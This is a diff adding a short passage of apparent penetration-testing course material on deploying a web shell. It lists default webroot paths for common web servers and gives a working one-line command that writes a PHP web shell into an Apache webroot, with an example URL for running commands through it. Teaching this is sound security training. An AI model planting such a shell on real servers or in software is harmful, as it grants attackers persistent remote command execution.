@@ -1,1 +1,18 @@
+Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file i.e. shell.php and upload it, and then access our uploaded file to execute commands.
 
+However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So the first step is to identify where the webroot is.
+
+| Web server | Default Webroot |
+| ---------- | --------------- |
+| Apache | /var/www/html/ |
+| Nginx | /usr/local/nginx/html/ |
+| IIS | c:\inetpub\wwwroot\ |
+| XAMPP | c:\xampp\htdocs\ |
+
+Taking Apache as the example:
+
+echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+
+We can access the web shell through a browser or by using cURL.
+
+Browser: http://SERVER_IP:PORT/shell.php?cmd=id
